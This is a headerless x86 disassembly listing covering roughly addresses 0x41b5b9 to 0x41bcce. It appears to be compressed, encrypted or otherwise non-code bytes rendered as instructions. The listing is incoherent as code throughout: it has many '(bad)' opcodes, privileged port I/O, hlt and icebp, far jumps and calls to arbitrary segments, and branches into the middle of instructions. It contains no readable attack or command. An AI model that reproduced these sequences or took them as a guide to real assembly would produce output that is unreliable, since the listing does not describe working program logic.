  41b5b9:	loopne 0x41b5fd
  41b5bb:	pop    ds
  41b5bc:	(bad)  [eax-0x2]
  41b5bf:	add    eax,0x5f22ea8d
  41b5c4:	add    ah,dh
  41b5c6:	xchg   edi,eax
  41b5c7:	ins    DWORD PTR es:[edi],dx
  41b5c8:	inc    ecx
  41b5c9:	sbb    al,0xa
  41b5cb:	aaa    
  41b5cc:	and    ch,al
  41b5ce:	adc    al,0xc0
  41b5d0:	mov    edi,DWORD PTR [edi]
  41b5d2:	adc    DWORD PTR [ebp+0x48bdf427],0xffffffd0
  41b5d9:	loop   0x41b5f8
  41b5db:	lahf   
  41b5dc:	mov    eax,0x4e3c7acc
  41b5e1:	repnz inc edi
  41b5e3:	bndldx (bad),[ebp+0x3e]
  41b5e7:	or     esp,eax
  41b5e9:	or     BYTE PTR [edi-0x3ec977e5],dl
  41b5ef:	push   ebp
  41b5f0:	retf   0x8988
  41b5f3:	adc    al,al
  41b5f5:	sub    al,0xc6
  41b5f7:	hlt    
  41b5f8:	shr    BYTE PTR [esi+esi*1-0x2f572e74],cl
  41b5ff:	sub    BYTE PTR [edi+0x5d28b254],bh
  41b605:	xor    bh,BYTE PTR [edi+ebp*2+0x6f]
  41b609:	aaa    
  41b60a:	and    ecx,DWORD PTR [esi+0x71e2f5d6]
  41b610:	mov    al,0x41
  41b612:	mov    ecx,DWORD PTR [ebp-0x32efe5a]
  41b618:	enter  0x3775,0x56
  41b61c:	ins    BYTE PTR es:[edi],dx
  41b61d:	push   eax
  41b61e:	jne    0x41b5d2
  41b620:	ret    
  41b621:	cli    
  41b622:	js     0x41b5ec
  41b624:	call   0x2550:0xcc6824b7
  41b62b:	aad    0xa
  41b62d:	sar    DWORD PTR [esi],0x1e
  41b630:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b631:	sbb    ch,BYTE PTR [ecx+0x35]
  41b634:	out    dx,eax
  41b635:	mov    bh,BYTE PTR [eax-0x19563a08]
  41b63b:	mov    edx,0xd7ba6b71
  41b640:	dec    edx
  41b641:	clc    
  41b642:	ss arpl bp,cx
  41b645:	lds    esp,FWORD PTR ds:0xcbb03ba7
  41b64b:	jmp    0x2aebaee0
  41b650:	shl    edx,1
  41b652:	fdiv   QWORD PTR [edx+0x73]
  41b655:	or     cl,cl
  41b657:	(bad)  
  41b658:	stos   BYTE PTR es:[edi],al
  41b659:	pop    esi
  41b65a:	or     al,0xd9
  41b65c:	test   DWORD PTR [edx+0x574e99ed],esp
  41b662:	or     eax,0x58e0bafd
  41b667:	imul   edx,DWORD PTR [edx],0x54
  41b66a:	push   ss
  41b66b:	bound  edi,QWORD PTR [ecx]
  41b66d:	mov    ds:0x44e540e3,eax
  41b672:	aaa    
  41b673:	leave  
  41b674:	push   0x7a
  41b676:	sar    BYTE PTR [edi],0x6d
  41b679:	push   cs
  41b67a:	pushf  
  41b67b:	jmp    0x41b618
  41b67d:	lahf   
  41b67e:	xchg   ebx,eax
  41b67f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b680:	or     bl,BYTE PTR ds:0x915df17e
  41b686:	ror    DWORD PTR [ecx+0x73],1
  41b689:	cmp    ch,BYTE PTR [edi+eiz*8+0x2]
  41b68d:	or     DWORD PTR [edx+0x22eeb47d],ebp
  41b693:	xchg   BYTE PTR es:[eax+0x21],al
  41b697:	or     bl,bl
  41b699:	cmp    BYTE PTR [edi],ch
  41b69b:	aad    0xd4
  41b69d:	dec    eax
  41b69e:	add    eax,0x433a3cf0
  41b6a3:	xchg   esi,eax
  41b6a4:	repnz xchg ebx,eax
  41b6a6:	mov    al,ds:0x2c278c9f
  41b6ab:	push   edi
  41b6ac:	sub    bl,BYTE PTR [esi]
  41b6ae:	pushf  
  41b6af:	fcom   DWORD PTR [esi-0x3c]
  41b6b2:	icebp  
  41b6b3:	sub    al,0xfa
  41b6b5:	retf   
  41b6b6:	jb     0x41b6fc
  41b6b8:	sbb    bl,BYTE PTR [edx]
  41b6ba:	or     DWORD PTR [edx],ebp
  41b6bc:	les    esi,FWORD PTR [ebp+0x5f6b934f]
  41b6c2:	outs   dx,BYTE PTR ds:[esi]
  41b6c3:	add    BYTE PTR [esi],bh
  41b6c5:	jne    0x41b682
  41b6c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6c8:	push   es
  41b6c9:	js     0x41b669
  41b6cb:	sbb    BYTE PTR [ecx],al
  41b6cd:	in     al,0x38
  41b6cf:	js     0x41b6b2
  41b6d1:	sub    BYTE PTR [ebp-0x63],0x3c
  41b6d5:	jmp    0x3c5fbc71
  41b6da:	not    BYTE PTR [ecx+0x42]
  41b6dd:	mov    ch,0x69
  41b6df:	push   ebp
  41b6e0:	dec    edx
  41b6e1:	pop    ecx
  41b6e2:	cmp    esp,DWORD PTR [edx-0x1521186f]
  41b6e8:	mov    ds:0x87174d39,al
  41b6ed:	xor    DWORD PTR [esp+ebx*1-0x57],0xeeccb210
  41b6f5:	mul    DWORD PTR [edi-0x3d]
  41b6f8:	div    bl
  41b6fa:	or     eax,0x529f9c
  41b6ff:	jmp    0x41b68e
  41b701:	or     eax,DWORD PTR [edx-0x42ef22f2]
  41b707:	jmp    0x41b74a
  41b709:	and    al,0x85
  41b70b:	rol    bl,1
  41b70d:	psubusb mm6,mm5
  41b710:	les    ecx,FWORD PTR [ebp+0x3125e5da]
  41b716:	cdq    
  41b717:	outs   dx,BYTE PTR ds:[esi]
  41b718:	push   eax
  41b719:	(bad)  
  41b71b:	pop    esi
  41b71c:	and    eax,0xe7032277
  41b721:	sbb    dl,BYTE PTR [esi+0x43]
  41b724:	ret    0x9b9a
  41b727:	jne    0x41b75b
  41b729:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b72a:	bound  edi,QWORD PTR [ecx]
  41b72c:	dec    ecx
  41b72d:	jmp    0x41b6cf
  41b72f:	mov    ch,0xaf
  41b731:	lods   eax,DWORD PTR ds:[esi]
  41b732:	or     esi,DWORD PTR [edx-0x32da78c9]
  41b738:	inc    eax
  41b739:	push   ecx
  41b73a:	fadd   QWORD PTR [edi]
  41b73c:	xchg   edi,eax
  41b73d:	lods   eax,DWORD PTR ds:[esi]
  41b73e:	out    dx,al
  41b73f:	sahf   
  41b740:	xchg   ebp,eax
  41b741:	hlt    
  41b742:	pushf  
  41b743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b744:	pop    es
  41b745:	stos   DWORD PTR es:[edi],eax
  41b746:	rol    DWORD PTR [ebp-0x1d045f51],1
  41b74c:	adc    al,0xe6
  41b74e:	bound  esi,QWORD PTR [ebp-0x70a8ffd1]
  41b754:	lds    esi,FWORD PTR [esi]
  41b756:	fdiv   st,st(3)
  41b758:	aad    0xcc
  41b75a:	cmp    al,al
  41b75c:	enter  0xb759,0x26
  41b760:	data16 or al,0x52
  41b763:	mov    dh,0xe8
  41b765:	fbstp  TBYTE PTR [ebx+0x6f522498]
  41b76b:	dec    eax
  41b76c:	stos   BYTE PTR es:[edi],al
  41b76d:	jmp    0x41b78c
  41b76f:	jecxz  0x41b6f9
  41b771:	dec    ebp
  41b772:	and    ch,BYTE PTR [ebx]
  41b774:	inc    eax
  41b775:	mov    al,ds:0xfb4fb3e1
  41b77a:	mov    DWORD PTR [ebx],edi
  41b77c:	addr16 or al,0xf6
  41b77f:	int    0xf6
  41b781:	pop    ebx
  41b782:	nop
  41b783:	pop    esi
  41b784:	jp     0x41b74a
  41b786:	cmp    al,0xae
  41b788:	das    
  41b789:	sub    BYTE PTR [edi],al
  41b78b:	scas   al,BYTE PTR es:[edi]
  41b78c:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b78e:	adc    BYTE PTR [edi-0x5a16ea73],bl
  41b794:	dec    esi
  41b795:	js     0x41b760
  41b797:	cmp    eax,0x80376171
  41b79c:	mov    ds:0x92dfe35d,al
  41b7a1:	sub    ecx,DWORD PTR ds:0x3a44a1b9
  41b7a7:	addr16 mov ds:0xddce,eax
  41b7ab:	xchg   ah,ch
  41b7ad:	lods   al,BYTE PTR ds:[esi]
  41b7ae:	aad    0x63
  41b7b0:	jae    0x41b75e
  41b7b2:	lods   eax,DWORD PTR ds:[esi]
  41b7b3:	fistp  DWORD PTR [esp+edx*2-0x271fe35f]
  41b7ba:	xor    eax,DWORD PTR [esi-0x6b]
  41b7bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7bf:	jge    0x41b82c
  41b7c1:	or     al,0xa6
  41b7c3:	cmp    eax,0x58029210
  41b7c8:	(bad)  
  41b7c9:	mov    ah,0xb7
  41b7cb:	sub    al,0xb2
  41b7cd:	shl    DWORD PTR [edi+0x2b1f6b26],0x82
  41b7d4:	mov    dh,0x7b
  41b7d6:	rol    DWORD PTR ds:0x2aad356b,cl
  41b7dc:	add    BYTE PTR [edi],dl
  41b7de:	xor    al,0x1a
  41b7e0:	mov    dl,0xd9
  41b7e2:	jns    0x41b81f
  41b7e4:	jno    0x41b7f3
  41b7e6:	pop    ss
  41b7e7:	jge    0x41b848
  41b7e9:	cmp    al,0xb4
  41b7eb:	fdiv   QWORD PTR [edi+0x6b17e1b]
  41b7f1:	jg     0x41b84b
  41b7f3:	cs fwait
  41b7f5:	push   0x30
  41b7f7:	xchg   ah,dh
  41b7f9:	inc    ebx
  41b7fa:	sbb    esi,edx
  41b7fc:	mov    ebp,0x96f54a5d
  41b801:	lahf   
  41b802:	cld    
  41b803:	xchg   esp,eax
  41b804:	adc    ch,bh
  41b806:	jmp    0x41b886
  41b808:	mov    ah,0xa7
  41b80a:	fadd   st,st(2)
  41b80c:	mov    cl,BYTE PTR [eax-0x6e]
  41b80f:	sti    
  41b810:	lods   eax,DWORD PTR ds:[esi]
  41b811:	mov    dh,0xdf
  41b813:	inc    edi
  41b814:	adc    eax,0xc1686ff2
  41b819:	push   0x2f
  41b81b:	test   ebx,esp
  41b81d:	jecxz  0x41b808
  41b81f:	neg    DWORD PTR [ebp+esi*1-0xb2ef0d2]
  41b826:	or     dl,BYTE PTR [ecx]
  41b828:	xor    DWORD PTR [ebx],edx
  41b82a:	xchg   edi,eax
  41b82b:	and    BYTE PTR [edi+0x7a951b8c],dh
  41b831:	adc    al,0xf5
  41b833:	xor    eax,0x10c3e7b0
  41b838:	daa    
  41b839:	mov    eax,ds:0xabf078b7
  41b83e:	and    al,0x9d
  41b840:	add    al,0x96
  41b842:	out    0x2f,al
  41b844:	sub    esp,esi
  41b846:	sbb    BYTE PTR [esi],al
  41b848:	arpl   bx,bx
  41b84a:	add    edi,ebx
  41b84c:	sbb    ah,BYTE PTR [edx-0x25a4b3ea]
  41b852:	xchg   esi,eax
  41b853:	ins    BYTE PTR es:[edi],dx
  41b854:	xor    BYTE PTR [ebx-0x2c],0x3f
  41b858:	dec    esi
  41b859:	popf   
  41b85a:	add    ah,BYTE PTR [ebx]
  41b85c:	push   ss
  41b85d:	addr16 repnz loop 0x41b7ff
  41b861:	cwde   
  41b862:	in     eax,dx
  41b863:	dec    ecx
  41b864:	mov    esi,0xe62406b0
  41b869:	mov    ecx,0xe6793c2b
  41b86e:	xchg   edi,eax
  41b86f:	outs   dx,DWORD PTR ds:[esi]
  41b870:	test   eax,0xcdc7435f
  41b875:	in     al,dx
  41b876:	add    ecx,ebp
  41b878:	inc    ebx
  41b879:	call   0x226:0x58583aa0
  41b880:	pop    es
  41b881:	aas    
  41b882:	gs addr16 push edx
  41b885:	inc    esp
  41b886:	ss cwde 
  41b888:	cli    
  41b889:	or     eax,0x1845397a
  41b88e:	mov    ecx,0x10852955
  41b893:	inc    ebp
  41b894:	(bad)  
  41b895:	in     eax,dx
  41b896:	scas   al,BYTE PTR es:[edi]
  41b897:	add    eax,0x5b7bf2e4
  41b89c:	xor    eax,0x1ca8215b
  41b8a1:	arpl   WORD PTR fs:[eax-0x6b77bdc7],sp
  41b8a8:	out    0x90,al
  41b8aa:	xchg   edi,eax
  41b8ab:	mov    bl,0x16
  41b8ad:	fwait
  41b8ae:	pop    edi
  41b8af:	xchg   ebp,eax
  41b8b0:	cwde   
  41b8b1:	cld    
  41b8b2:	sbb    eax,0x840859c
  41b8b7:	push   eax
  41b8b8:	adc    ebp,esi
  41b8ba:	add    al,0x68
  41b8bc:	out    0xd,al
  41b8be:	push   ecx
  41b8bf:	ret    0xc1c4
  41b8c2:	jl     0x41b8d9
  41b8c4:	jmp    0x3423eed5
  41b8c9:	shl    BYTE PTR [esi],1
  41b8cb:	aam    0xeb
  41b8cd:	shl    eax,cl
  41b8cf:	bound  ebx,QWORD PTR [edx+ecx*4-0x57]
  41b8d3:	into   
  41b8d4:	mov    ds:0x6a378ef9,al
  41b8d9:	pop    ebx
  41b8da:	xor    al,0xff
  41b8dc:	nop
  41b8dd:	or     eax,0x5915c484
  41b8e2:	jmp    0xc9bfef35
  41b8e7:	push   edi
  41b8e8:	daa    
  41b8e9:	sbb    ecx,0x5
  41b8ec:	cmp    ebx,ecx
  41b8ee:	rol    BYTE PTR [edx+ebp*2],1
  41b8f1:	pop    es
  41b8f2:	stc    
  41b8f3:	pop    es
  41b8f4:	sub    eax,0x3a8f81f5
  41b8f9:	iret   
  41b8fa:	je     0x41b931
  41b8fc:	jmp    0x41b947
  41b8fe:	int3   
  41b8ff:	mov    cl,0xa6
  41b901:	adc    DWORD PTR [ebp+0x1ea5f34f],edi
  41b907:	rcr    BYTE PTR [ebx+0x25f6eb1b],cl
  41b90d:	shl    DWORD PTR [eax+eax*4],1
  41b910:	add    BYTE PTR [edi+0x77e272af],0x71
  41b917:	xchg   ebp,eax
  41b918:	mov    eax,0x62658a45
  41b91d:	call   0x4d8:0xe0172db7
  41b924:	or     ah,BYTE PTR [edx]
  41b926:	popf   
  41b927:	mov    BYTE PTR [ebp+0x6e30492d],dh
  41b92d:	cld    
  41b92e:	ins    DWORD PTR es:[edi],dx
  41b92f:	xor    esp,DWORD PTR [edx+0x65]
  41b932:	jmp    0x41b91c
  41b934:	(bad)  
  41b936:	and    eax,0x3ec286a0
  41b93b:	stos   DWORD PTR es:[edi],eax
  41b93c:	shl    ebp,1
  41b93e:	jp     0x41b93f
  41b940:	jp     0x41b8fa
  41b942:	outs   dx,BYTE PTR ds:[esi]
  41b943:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b944:	pop    ecx
  41b945:	cld    
  41b946:	shl    cl,cl
  41b948:	js     0x41b908
  41b94a:	pop    esi
  41b94b:	adc    DWORD PTR [edi],eax
  41b94d:	xchg   edx,eax
  41b94e:	or     DWORD PTR [ebx-0x6e],esi
  41b951:	or     al,dh
  41b953:	dec    edx
  41b954:	iret   
  41b955:	cwde   
  41b956:	std    
  41b957:	add    al,BYTE PTR [ebx]
  41b959:	aas    
  41b95a:	dec    esi
  41b95b:	sub    BYTE PTR es:[ebx],0x7a
  41b95f:	cmp    al,ah
  41b961:	xchg   esp,eax
  41b962:	repz dec esi
  41b964:	push   eax
  41b965:	cld    
  41b966:	sub    al,cl
  41b968:	lods   al,BYTE PTR ds:[esi]
  41b969:	sub    ah,ch
  41b96b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b96c:	xchg   ecx,eax
  41b96d:	leave  
  41b96e:	lock je 0x41b965
  41b971:	fcmovb st,st(1)
  41b973:	call   DWORD PTR [eax]
  41b975:	mov    esp,0xe2d515f0
  41b97a:	hlt    
  41b97b:	shr    BYTE PTR [ebx+edx*8],cl
  41b97e:	dec    esi
  41b97f:	out    dx,eax
  41b980:	pop    esi
  41b981:	in     al,0x1e
  41b983:	js     0x41b9cb
  41b985:	mov    dl,0xac
  41b987:	mov    dh,0x6c
  41b989:	xchg   ebx,eax
  41b98a:	push   esi
  41b98b:	ins    DWORD PTR es:[edi],dx
  41b98c:	cmp    eax,0x9bc9b592
  41b991:	cld    
  41b992:	xchg   ebx,eax
  41b993:	sar    BYTE PTR [ecx+ecx*1+0x1e],cl
  41b997:	dec    ecx
  41b998:	shl    DWORD PTR [eax-0x68d09bbc],0xd3
  41b99f:	and    DWORD PTR [esi],edi
  41b9a1:	lahf   
  41b9a2:	sub    WORD PTR [edi+0x6f34805f],cx
  41b9a9:	sar    DWORD PTR [ebp-0x1eeb1145],cl
  41b9af:	je     0x41b9aa
  41b9b1:	scas   al,BYTE PTR es:[edi]
  41b9b2:	lahf   
  41b9b3:	stc    
  41b9b4:	pop    ds
  41b9b5:	sub    al,0xa6
  41b9b7:	in     al,0xe3
  41b9b9:	aaa    
  41b9ba:	test   DWORD PTR [esi],ebp
  41b9bc:	retf   
  41b9bd:	mov    gs,WORD PTR [edi]
  41b9bf:	pop    es
  41b9c0:	push   esi
  41b9c1:	out    dx,eax
  41b9c2:	dec    esp
  41b9c3:	fdiv   QWORD PTR [ebx-0x2b]
  41b9c6:	and    dl,ah
  41b9c8:	das    
  41b9c9:	js     0x41b97c
  41b9cb:	sub    dh,bh
  41b9cd:	shl    BYTE PTR [ebx-0x61],cl
  41b9d0:	inc    edi
  41b9d1:	push   edx
  41b9d2:	int3   
  41b9d3:	xor    eax,0x93254d12
  41b9d8:	dec    eax
  41b9d9:	mov    al,0x9b
  41b9db:	jb     0x41b994
  41b9dd:	loope  0x41b976
  41b9df:	repz xor eax,0xdd7d2595
  41b9e5:	in     al,dx
  41b9e6:	add    esi,edx
  41b9e8:	scas   al,BYTE PTR es:[edi]
  41b9e9:	jnp    0x41ba2f
  41b9eb:	nop
  41b9ec:	stos   BYTE PTR es:[edi],al
  41b9ed:	(bad)  
  41b9ee:	mov    ds:0x8524008f,eax
  41b9f3:	dec    eax
  41b9f4:	pop    WORD PTR ds:0xce0b05a7
  41b9fb:	ret    0x1e34
  41b9fe:	jmp    FWORD PTR [edi+0x6216277]
  41ba04:	xchg   BYTE PTR [edi-0x207a2393],bh
  41ba0a:	mov    eax,0x2de1b7a5
  41ba0f:	xchg   ebx,eax
  41ba10:	xchg   edx,eax
  41ba11:	popf   
  41ba12:	cs jmp 0x7a17:0x456bdcd7
  41ba1a:	fnclex 
  41ba1c:	pop    edi
  41ba1d:	and    al,0xa5
  41ba1f:	inc    eax
  41ba20:	call   0x9415:0xa5365f04
  41ba27:	repnz retf 0x5c3
  41ba2b:	pop    edx
  41ba2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba2d:	jbe    0x41ba55
  41ba2f:	jb     0x41ba14
  41ba31:	xchg   esi,eax
  41ba32:	jecxz  0x41ba4a
  41ba34:	lock retf 
  41ba36:	sbb    BYTE PTR [ebx],0x42
  41ba39:	cmp    bl,BYTE PTR es:[ebx+esi*8+0x6f8c8bfc]
  41ba41:	jno    0x41ba25
  41ba43:	in     al,dx
  41ba44:	sbb    BYTE PTR [ecx+0x1e6cd3a0],dl
  41ba4a:	or     BYTE PTR [eax+0x576f34a7],0xc6
  41ba51:	fidivr DWORD PTR [edi+0x261ba704]
  41ba57:	loopne 0x41ba83
  41ba59:	xchg   ecx,eax
  41ba5a:	mov    al,ds:0x19fdb905
  41ba5f:	(bad)  
  41ba60:	xchg   ebx,eax
  41ba61:	cld    
  41ba62:	add    BYTE PTR [ebp-0x5dd5a1fc],ah
  41ba68:	jbe    0x41ba14
  41ba6a:	push   0x16b19d7a
  41ba6f:	mov    al,ds:0xea6ea002
  41ba74:	fwait
  41ba75:	sti    
  41ba76:	js     0x41b9ff
  41ba78:	ins    DWORD PTR es:[edi],dx
  41ba79:	fidiv  WORD PTR [ebx]
  41ba7b:	fdiv   QWORD PTR [ecx+0x62]
  41ba7e:	jmp    0x39b0:0x27a3d09
  41ba85:	sar    bl,cl
  41ba87:	mov    ecx,0xe2d3f14e
  41ba8c:	adc    eax,DWORD PTR [eax]
  41ba8e:	and    eax,0x2070f0ce
  41ba93:	clc    
  41ba94:	xchg   esi,eax
  41ba95:	mov    dh,BYTE PTR [ebx]
  41ba97:	div    DWORD PTR [edi]
  41ba99:	das    
  41ba9a:	mov    DWORD PTR [esi],esi
  41ba9c:	sub    DWORD PTR [esi],edi
  41ba9e:	pop    esp
  41ba9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41baa0:	push   ss
  41baa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41baa2:	pop    ebp
  41baa3:	addr16 dec eax
  41baa5:	sbb    eax,0x6ccbe74d
  41baaa:	jb     0x41baaa
  41baac:	cmc    
  41baad:	scas   eax,DWORD PTR es:[edi]
  41baae:	out    0x70,eax
  41bab0:	ret    
  41bab1:	loope  0x41bad9
  41bab3:	imul   eax,DWORD PTR [ecx-0x71e96c5e],0x39
  41baba:	lahf   
  41babb:	jb     0x41ba72
  41babd:	bound  edx,QWORD PTR [esi]
  41babf:	test   eax,0xa6983da9
  41bac4:	mov    ch,BYTE PTR [edi-0x73854119]
  41baca:	out    dx,eax
  41bacb:	inc    ebp
  41bacc:	inc    edx
  41bacd:	mov    eax,0x7454b04f
  41bad2:	xor    cl,ch
  41bad4:	stos   DWORD PTR es:[edi],eax
  41bad5:	loop   0x41bacf
  41bad7:	pop    esi
  41bad8:	cwde   
  41bad9:	sub    esi,DWORD PTR gs:[ebx+ecx*8-0x7bf2093]
  41bae1:	adc    eax,0xbbc0f27a
  41bae6:	imul   edi,eax,0x250f0b71
  41baec:	push   ebp
  41baed:	ja     0x41ba97
  41baef:	fst    QWORD PTR [ebx+0x57]
  41baf2:	pop    edi
  41baf3:	fs cmp al,0x64
  41baf6:	cmp    DWORD PTR [eax+0x76],edi
  41baf9:	pushf  
  41bafa:	repnz in eax,0x3b
  41bafd:	(bad)  
  41bafe:	jmp    0x41ba80
  41bb00:	repz xchg ebx,eax
  41bb02:	out    dx,eax
  41bb03:	in     al,dx
  41bb04:	add    bl,ch
  41bb06:	cmp    BYTE PTR [eax],cl
  41bb08:	xchg   ebp,eax
  41bb09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb0a:	push   0xffffff8f
  41bb0c:	aad    0x6
  41bb0e:	add    BYTE PTR [edx+0x42],bh
  41bb11:	test   BYTE PTR [eax-0x50b9f1c1],0x47
  41bb18:	xchg   ebp,eax
  41bb19:	pop    ebx
  41bb1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb1b:	dec    eax
  41bb1c:	js     0x41bb3c
  41bb1e:	mov    ch,0x17
  41bb20:	lds    edi,FWORD PTR [ebp+edi*4-0x71]
  41bb24:	xor    bl,BYTE PTR [esi]
  41bb26:	fisub  WORD PTR [ebp-0x45]
  41bb29:	rol    al,cl
  41bb2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb2c:	inc    eax
  41bb2d:	jns    0x41bba8
  41bb2f:	leave  
  41bb30:	inc    edx
  41bb31:	(bad)  
  41bb32:	and    eax,0x6850f1f5
  41bb37:	arpl   di,si
  41bb39:	lahf   
  41bb3a:	mov    cl,0x1a
  41bb3c:	inc    esp
  41bb3d:	xchg   ebp,eax
  41bb3e:	mov    dh,0x7f
  41bb40:	adc    BYTE PTR [edx],0x5b
  41bb43:	cmp    DWORD PTR [edx-0x5f2ff632],edi
  41bb49:	or     BYTE PTR gs:[ebx+0x36],ch
  41bb4d:	and    BYTE PTR [edx+0x66],bh
  41bb50:	mov    dh,0x4b
  41bb52:	popf   
  41bb53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb54:	sbb    ah,bh
  41bb56:	out    0x62,eax
  41bb58:	push   cs
  41bb59:	mov    esp,0x22e4bfe7
  41bb5e:	mov    al,0x58
  41bb60:	aaa    
  41bb61:	icebp  
  41bb62:	das    
  41bb63:	inc    ebp
  41bb64:	dec    esp
  41bb65:	mov    bh,0xc6
  41bb67:	sub    BYTE PTR [eax+0x39],0x93
  41bb6b:	daa    
  41bb6c:	scas   al,BYTE PTR es:[edi]
  41bb6d:	and    al,0xe6
  41bb6f:	mov    dx,0xf509
  41bb73:	lock dec edx
  41bb75:	pushf  
  41bb76:	stc    
  41bb77:	mov    dh,0x7
  41bb79:	mov    es,WORD PTR [ebx]
  41bb7b:	jl     0x41bbcf
  41bb7d:	pusha  
  41bb7e:	jns    0x41bbd7
  41bb80:	mov    esp,0x19925738
  41bb85:	sub    ecx,esi
  41bb87:	or     al,0xb0
  41bb89:	cmp    ecx,DWORD PTR [eax]
  41bb8b:	jae    0x41bb4a
  41bb8d:	jns    0x41bbda
  41bb8f:	jb     0x41bb4c
  41bb91:	js     0x41bbc0
  41bb93:	stos   DWORD PTR es:[edi],eax
  41bb94:	das    
  41bb95:	jmp    0x4723:0xa4d8e329
  41bb9c:	cwde   
  41bb9d:	pop    esp
  41bb9e:	fld    QWORD PTR [eax+ebx*8-0x79267b63]
  41bba5:	inc    eax
  41bba6:	in     eax,0x8c
  41bba8:	retf   
  41bba9:	jmp    0x41bbb9
  41bbab:	cmp    cl,BYTE PTR [edx]
  41bbad:	icebp  
  41bbae:	mov    edx,0x5d926d1b
  41bbb3:	out    0x36,eax
  41bbb5:	jmp    0x8e37:0xbc01c5c7
  41bbbc:	int3   
  41bbbd:	xchg   ebp,eax
  41bbbe:	test   BYTE PTR [eax+0x17531b0c],dl
  41bbc4:	aam    0x9e
  41bbc6:	adc    ch,dh
  41bbc8:	and    BYTE PTR [edx+0x389c8da1],0x72
  41bbcf:	cmc    
  41bbd0:	pop    esp
  41bbd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbd2:	or     al,0x85
  41bbd4:	(bad)  
  41bbd5:	out    0x10,al
  41bbd7:	inc    edx
  41bbd8:	(bad)  
  41bbd9:	test   al,0xea
  41bbdb:	pop    ebp
  41bbdc:	sbb    DWORD PTR [ebp+edi*2-0x30],eax
  41bbe0:	add    BYTE PTR [ecx],ah
  41bbe2:	or     eax,0xda23a9b3
  41bbe7:	fisub  DWORD PTR [eax+0x5018d65a]
  41bbed:	leave  
  41bbee:	sbb    ecx,ecx
  41bbf0:	and    BYTE PTR [edx+0x765db001],bl
  41bbf6:	cmp    ch,BYTE PTR [ebx]
  41bbf8:	fcom   DWORD PTR [edi+ebx*4]
  41bbfb:	shr    BYTE PTR [edi],0xa5
  41bbfe:	mov    bh,0x6e
  41bc00:	cld    
  41bc01:	jmp    0xa19a4db
  41bc06:	pop    edi
  41bc07:	sbb    eax,0xdce7f390
  41bc0c:	rol    dl,cl
  41bc0e:	mov    bh,0x9e
  41bc10:	xchg   esp,eax
  41bc11:	int    0xb0
  41bc13:	out    0xb,eax
  41bc15:	inc    edi
  41bc16:	(bad)  
  41bc17:	jnp    0x41bc62
  41bc19:	popa   
  41bc1a:	or     bh,BYTE PTR [ebx+edi*1+0x4413124e]
  41bc21:	jbe    0x41bc42
  41bc23:	ja     0x41bc87
  41bc25:	xor    al,0x5e
  41bc27:	mov    edi,0xcbdababd
  41bc2c:	sub    edx,edi
  41bc2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc2f:	rol    DWORD PTR [ecx],1
  41bc31:	mov    esi,ss
  41bc33:	pop    es
  41bc34:	or     al,dh
  41bc36:	aaa    
  41bc37:	pop    esp
  41bc38:	mov    ds:0x31d9dade,eax
  41bc3d:	mov    gs,WORD PTR [eax-0xe4c077b]
  41bc43:	lds    ebp,FWORD PTR [esi]
  41bc45:	pop    es
  41bc46:	mov    ch,0x90
  41bc48:	dec    ebp
  41bc49:	xchg   ebp,eax
  41bc4a:	push   cs
  41bc4b:	push   ss
  41bc4c:	aam    0x21
  41bc4e:	mov    al,ds:0xb8f48b7
  41bc53:	add    DWORD PTR [esi+0x2e],ebp
  41bc56:	xchg   ecx,eax
  41bc57:	mov    bh,BYTE PTR [ecx-0x79]
  41bc5a:	gs jp  0x41bbfe
  41bc5d:	popa   
  41bc5e:	test   DWORD PTR [ebp-0x34],0x266f81
  41bc65:	pop    edx
  41bc66:	dec    esp
  41bc67:	xlat   BYTE PTR ds:[ebx]
  41bc68:	fstp   QWORD PTR [ecx]
  41bc6a:	push   edi
  41bc6b:	stc    
  41bc6c:	into   
  41bc6d:	jnp    0x41bc1f
  41bc6f:	pop    edx
  41bc70:	or     al,0xe6
  41bc72:	nop
  41bc73:	inc    esp
  41bc74:	ins    BYTE PTR es:[edi],dx
  41bc75:	(bad)  
  41bc76:	jg     0x41bc75
  41bc78:	data16 jno 0x41bcca
  41bc7b:	hlt    
  41bc7c:	xor    ch,cl
  41bc7e:	out    dx,al
  41bc7f:	(bad)  
  41bc80:	jne    0x41bcf3
  41bc82:	adc    ebx,ebx
  41bc84:	cmp    bl,BYTE PTR [edx+edi*2-0x16fd7669]
  41bc8b:	jne    0x41bcc1
  41bc8d:	push   0xf74a0495
  41bc92:	es xchg edx,eax
  41bc94:	inc    esp
  41bc95:	scas   eax,DWORD PTR es:[edi]
  41bc96:	add    ebp,edi
  41bc98:	jbe    0x41bd15
  41bc9a:	xor    BYTE PTR [edx],bl
  41bc9c:	in     eax,dx
  41bc9d:	push   ecx
  41bc9e:	daa    
  41bc9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bca0:	mov    ecx,0x8412e3c3
  41bca5:	adc    edx,ecx
  41bca7:	and    al,0xe2
  41bca9:	and    ebp,esi
  41bcab:	cdq    
  41bcac:	push   0xffffffc3
  41bcae:	jno    0x41bcd4
  41bcb0:	jge    0x41bd0b
  41bcb2:	add    DWORD PTR [edx+0x4ecdf6eb],0x73
  41bcb9:	call   0x5700:0x104dde69
  41bcc0:	fidivr DWORD PTR [esi+0x661d2168]
  41bcc6:	fcmovnu st,st(7)
  41bcc8:	leave  
  41bcc9:	mov    ds:0x22c69d57,eax
  41bcce:	rcr    BYTE PTR ds:0x15ff828a,1
